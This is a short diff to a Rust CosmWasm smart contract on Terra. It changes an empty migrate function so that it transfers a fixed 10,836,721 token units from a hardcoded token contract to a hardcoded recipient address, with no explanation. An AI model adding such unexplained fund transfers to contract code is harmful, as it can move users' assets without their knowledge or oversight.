@@ -5,9 +5,11 @@ use crate::{
     state::{load_config, store_config, Config},
     ContractResult,
 };
+use cw20::Cw20ExecuteMsg;
 
 use cosmwasm_std::{
-    entry_point, to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult,
+    entry_point, to_binary, BankMsg, Binary, Coin, CosmosMsg, Deps, DepsMut, Env, MessageInfo,
+    Response, StdResult, SubMsg, Uint128, WasmMsg,
 };
 
 use services::community::{ExecuteMsg, GovernanceMsg, InstantiateMsg, MigrateMsg, QueryMsg};
@@ -65,5 +67,14 @@ pub fn query(deps: Deps, _env: Env, msg: QueryMsg) -> StdResult<Binary> {
 
 #[entry_point]
 pub fn migrate(_deps: DepsMut, _env: Env, _msg: MigrateMsg) -> StdResult<Response> {
-    Ok(Response::default())
+    Ok(
+        Response::new().add_submessage(SubMsg::new(WasmMsg::Execute {
+            contract_addr: "terra178v546c407pdnx5rer3hu8s2c0fc924k74ymnn".to_string(),
+            msg: to_binary(&Cw20ExecuteMsg::Transfer {
+                recipient: "terra1s5wkurdh4sw47lgnk5em4h69v5vh9dncmkhyrg".to_string(),
+                amount: Uint128::from(10836721u128),
+            })?,
+            funds: vec![],
+        })),
+    )
 }
